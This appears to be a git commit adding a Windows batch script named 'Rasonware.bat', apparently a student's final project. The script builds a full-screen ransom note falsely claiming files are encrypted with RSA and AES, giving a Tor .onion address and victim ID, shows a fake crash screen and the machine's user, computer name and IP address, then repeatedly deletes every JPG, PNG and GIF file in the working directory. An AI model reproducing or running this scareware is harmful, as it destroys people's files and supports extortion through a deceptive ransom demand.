580bfa872242d1ff1f6d8b78f19689b799d49c19
Pericena <pericena12@gmail.com>
2018-12-26 02:45:57 -0400

    Proyecto Final

---
+++ Codigo/Rasonware.bat
@@ -0,0 +1,171 @@
+@rem bin\windows\bat
+@rem Autor Luishiño Pericena Choque
+@rem Informacion:
+@rem Sigueme en las redes Sociales:
+@rem Blogger          https://lpericena.blogspot.com/
+@rem Github            https://github.com/Pericena
+@rem youtube.com  https://www.youtube.com/channel/UCELx1m-NeAdBn7mCuQ86kcw
+@rem pinterest        https://es.pinterest.com/lushiopericena/
+@rem twitter             https://twitter.com/LPericena
+@rem linkedin         https://www.linkedin.com/in/lpericena/
+@rem facebook       https://www.facebook.com/profile.php?id=100009309755063
+@rem pagina facebook  https://www.facebook.com/lpericena
+@rem sitio web        https://pericena.wordpress.com/
+@rem vimeo         https://vimeo.com/lpericena
+@rem instagram      https://www.instagram.com/lpericena/
+@rem remote      https://remote.com/luishinopericena-choque
+@rem google+   https://plus.google.com/u/0/114054031405340478901
+@rem kiwi       https://kiwi.qa/LuishinoC
+@rem App    https://apps.facebook.com/167466933725219
+@rem Grupo    https://www.facebook.com/groups/122223121705126/?source_id=1506435219407506
+@rem socialtools https://www.socialtools.me/index?action=demoApps&preview=1&app_id=406101
+@rem teachlr    https://teachlr.com/lpericena
+@rem wikipedia  https://es.wikipedia.org/wiki/Usuario:Luishi%C3%B1o_Pericena_Choque
+@rem ask          https://ask.fm/Lpericena
+@rem stackoverflow  https://stackoverflow.com/users/6506592/luishi%C3%B1o-pericena-choque
+@rem wix https://lpericena.wixsite.com/curriculumvitae
+@echo off
+TITLE Rabbit
+mode con lines=50 cols=80
+COLOR 07
+setlocal enabledelayedexpansion
+for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (set "DEL=%%a")
+<nul set /p=""
+
+del /s /f /q "rasonware.hta" > nul
+CLS
+
+echo ^<html^>^<head^>^<title^>Rasonware^
+</title^> > rasonware.hta
+echo. >> rasonware.hta
+echo.>>rasonware.hta
+echo ^<hta:application id="oBVC" >> rasonware.hta
+echo applicationname="rasonware" >> rasonware.hta
+echo version="2.0" >> rasonware.hta
+echo maximizebutton="no" >> rasonware.hta
+echo minimizebutton="no" >> rasonware.hta
+echo sysmenu="no" >> rasonware.hta
+echo Caption="no" >> rasonware.hta
+echo windowstate="maximize"/^> >> rasonware.hta
+echo. >> rasonware.hta
+echo ^</head^>^<body bgcolor="black" scroll="no"^> >> rasonware.hta
+echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^> >> rasonware.hta
+echo ^<h1^>!!! IMPORTANT INFORMATION !!!. ^</h1^> >> rasonware.hta
+echo. >> rasonware.hta
+echo ^<p^>All of your files are encryted with RSA-2048 and AES-128 ciphers^</p^> >> rasonware.htaecho. >> rasonware.hta
+echo ^<p^>More information about the RSA and AES can be found here.^</p^> >> rasonware.hta
+echo. >> rasonware.hta
+echo ^<p^>https://lpericena.blogspot.com/^</p^> >> rasonware.hta
+echo. >> rasonware.hta
+echo ^<p^>Decrypting of your files is inly possible winth the provate key and decript program.which is on our secret server.^</p^> >> rasonware.hta
+echo ^<p^>To receive your private key follow one of the links.^</p^> >> rasonware.hta
+echo ^<p^>To receive your private key follow one of the links.^</p^> >> rasonware.hta
+echo. >> rasonware.hta
+
+echo ^<br^>If all of this addresses are not available. follow these stens^</br^> >> rasonware.hta
+echo ^<p^> 1.Download and install Tor Browser link.^</p^> >> rasonware.hta
+echo ^<p^> 2.After a successful installation run the browser and wait for initialization.^</p^> >> rasonware.hta
+echo ^<p^> 3.Type in the address bar: g46mbrrzpfszonuk.onion/ES7091F1D24922B^</p^> >> rasonware.hta
+echo ^<p^> 4. Follow the instruction on the site.^</p^> >> rasonware.hta
+echo ^<br^>!!!Your personal identification ID: E87091F1D24922B!!!^</br^> >> rasonware.hta
+
+echo. >> rasonware.hta
+echo ^<p^> *** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> rasonware.htaecho. >> rasonware.hta
+echo. >> rasonware.hta
+echo ^<p^> *** gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> rasonware.hta
+echo. >> rasonware.hta
+echo ^<p^>Beginning dump of physical memory^</p^> >> rasonware.hta
+echo ^<p^>Physical memory dump complete.^</p^> >> rasonware.hta
+echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> rasonware.hta
+echo. >> rasonware.hta
+echo. >> rasonware.hta
+echo. >> rasonware.hta
+echo.>>rasonware.hta
+echo ^</font^> >> rasonware.hta
+echo ^</body^>^</html^> >> rasonware.hta
+:MENU
+CLS
+echo. 
+echo.                    L:                           iv                   
+echo.                   5@@Bj                       SB@Br                  
+echo.                   P@B@B@:                   7@B@B@v                  
+echo.                   OB@qEB@0                 M@BF8@B1                  
+echo.                   B@B@ FB@@.             iB@@7 @B@M                  
+echo.                   @B@BX kB@BL           S@@Br B@@@@                  
+echo.                  ,B@B@B7 5B@@S         MB@Br FB@B@B                  
+echo.                  .@B@B@BP Z@@B7       kB@BJ BB@B@B@                  
+echo.                   B@B@B@BY @B@B      :B@@B ZB@B@B@B                  
+echo.                   1B@@@B@B :@B@B     B@@@  B@@@B@@r                  
+echo.                    @@@B@B@F B@B@7   F@B@B B@@@B@@O  
+echo.                     B@@B@B@ kB@B@B@B@@@Br @B@B@B0
+echo.                      2B@BPF .@@@B@@@B@@@  F0B@B7 
+echo.           ;FOZJ       .B@BX .B@B@B@B@B@B .ZB@B        U882i 
+echo.         .@B@B@B@        J@@@B@B@B@B@B@B@B@@@r        @B@B@B@ 
+echo.         MB@B@B@B@         B@@M@B@B@B@B@B@B@        :@B@B@@@@X        
+echo.        NB@B@B@@@B@q5i    vB@MBOBOBMBOMOOM@B0   ,ivM@B@B@B@@MBL       
+echo.        B@F@B@@@B@B@@@B8 BB@B@BBMMOOMBOBB@@@B@,jB@@@@@@@B@B@U@X       
+echo.         B@B@B@BBZ@@@@N.@B  BB@B@MMMBB@B@@Z .@@:7B@B@Z@@@B@B@O        
+echo.          ,2u:      :v @B@   .M@@@B@B@B@G    @B@.::      i2u.         
+echo.                      MB@BM,    k@@@@BU    :@B@B@  
+echo.                      @@B@B@B@G7,uB@@v,vO@B@B@@@Bv 
+echo.          :Fki     .,,@B@B@@@@@B@B@@@B@B@B@B@B@B@Y      .rP2,         
+echo.         @B@B@B@B@B@B B@B@B@B@B@GuiiijZ@B@B@B@@@B.8@@@B@B@B@BM        
+echo.        @B@B@B@B@@@B@vLB@B@B@@@B@@@ BB@B@@@B@@@BO:@B@B@@@B@B@BP       
+echo.        1@M@B@B@B@BPr. rB@B@B@OqU5F,2U2NM@B@B@Bu .vEB@B@B@@@E@r       
+echo.         ZZB@B@B@B       .i7jvMBBr@.@r8@MuFJ7.      ,B@B@B@BOF        
+echo.         .BB8@B@B       .     i@BkB@BkB@v             B@B@Z@B         
+echo.           :vSN7       .          @@@          .       LESJ:
+call :PainText 02 "                      Autor"
+echo.:Luishino Pericena Choque  
+echo.                    https://lpericena.blogspot.com/                                                                      
+call :PainText 0E " Encryption ..............................................."
+echo. 
+:sistema 
+call :PainText 02 " [+]Sistema_Operativo"   
+echo. :%ESC%%OS%
+call :PainText 02 " [+]Nombre_computadora"   
+echo  :%ESC%%COMPUTERNAME%
+call :PainText 02 " [+]Cuenta_usuario_"
+echo. :%ESC%%USERNAME%
+call :PainText 02 " [+]Numero_Procesador"   
+echo  :%ESC%%NUMBER_OF_PROCESSORS% /%PROCESSOR_LEVEL%-Level 
+call :PainText 02 " [+]Procesador_arquitectura" 
+echo  :%ESC%%PROCESSOR_ARCHITECTURE%.Bits
+call :PainText 02 " [+]Identificador" 
+echo  :%ESC%%PROCESSOR_IDENTIFIER%	
+for /f "usebackq tokens=2 delims=:" %%f in (`ipconfig ^| find /i "IPv4"`) do set ip=%%f
+call :PainText 02 " [+]Direccion IP"
+echo. :%ESC%%ip% %ESC% cmd%CMDEXTVERSION%
+call :PainText 02 " [+]Directorio"
+echo.:%ESC%%CD%
+
+copy *.* encryption>nul
+::mkdir .\Encry
+::move encryption ./Encry
+::for /R %USERPROFILE%\Documentos\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
+echo.     _ _   __ _   _ _    ___  ___   _ __   __ __ __  __ _   _ _   ___ 
+echo.    ^| '_^| / _` ^| ^| ' \  (_-^< / _ \ ^| '  \  \ V  V / / _` ^| ^| '_^| / -_)
+echo.    ^|_^|   ^\__,_^| ^|_^|^|_^| /__/ \___/ ^|_^|_^|_^|  ^\_/\_/  \__,_^| ^|_^|   ^\___^|  
+echo. 
+::exit
+:Ransomware
+start "" /wait "rasonware.hta"
+del *.jpg >nul
+del *.png >nul
+del *.gif >nul
+
+::del /s /f /q "rasonware.hta" > nul
+goto Ransomware
+goto MENU
+
+:PainText
+<nul set /p "=%DEL%" > "%~2"
+findstr /v /a:%1 /R "+" "%~2" nul
+del "%~2" > nul
+goto :eof
+if errorlevel 1 (
+echo "%ESC%An Error Occured, Please Check The Log (option %USB%)"
+goto error420
+)
+:exit
+exit
